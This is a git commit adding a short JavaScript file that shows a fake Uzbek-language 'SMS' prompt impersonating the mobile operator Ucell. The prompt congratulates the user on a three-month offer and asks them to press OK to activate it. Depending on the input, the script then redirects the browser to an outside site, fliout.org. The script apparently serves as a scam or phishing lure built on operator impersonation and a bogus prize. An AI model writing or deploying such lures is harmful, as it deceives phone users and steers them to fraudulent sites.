2cb06a5a2967d99d2c3b63d6a24eb044bdc6d983
ukpeha505-rgb <ukpeha505@gmail.com>
2026-01-07 08:31:06 +0100

    Create active-ucell.js

---
+++ active-ucell.js
@@ -0,0 +1,5 @@
+var password = 'FAOL QILING'
+password=prompt('SMS: Tabriklaymiz, sizning Ucell raqamingiz taklifni olish huquqiga ega 3 oy amal qiladi, faollashtirish uchun OK tugmasini bosing','FAOL QILING');
+if (password != 'FAOL QILING') {
+location.href='https://fliout.org/ucell.html';
+}
